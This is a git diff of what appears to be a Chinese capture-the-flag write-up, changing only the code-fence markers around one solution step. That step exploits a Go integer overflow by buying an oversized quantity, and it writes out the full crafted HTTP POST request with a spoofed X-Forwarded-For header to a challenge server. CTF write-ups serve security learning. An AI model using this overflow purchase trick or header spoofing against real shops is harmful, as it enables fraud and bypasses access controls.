@@ -43,7 +43,7 @@ for i in range(0xfffff):
 
 * step 2
 利用golang的整数溢出漏洞购买 18446744073709551615/5 + 1 个超级大辣条
-···
+```
 POST /buyltw HTTP/1.1
 Host: 117.78.26.155:31358
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:45.0) Gecko/20100101 Firefox/45.0
@@ -58,7 +58,7 @@ X-Forwarded-For: 127.0.0.1
 Connection: close
 
 number=3689348814741910324
-···
+```
 
 *step 3购买flag
 
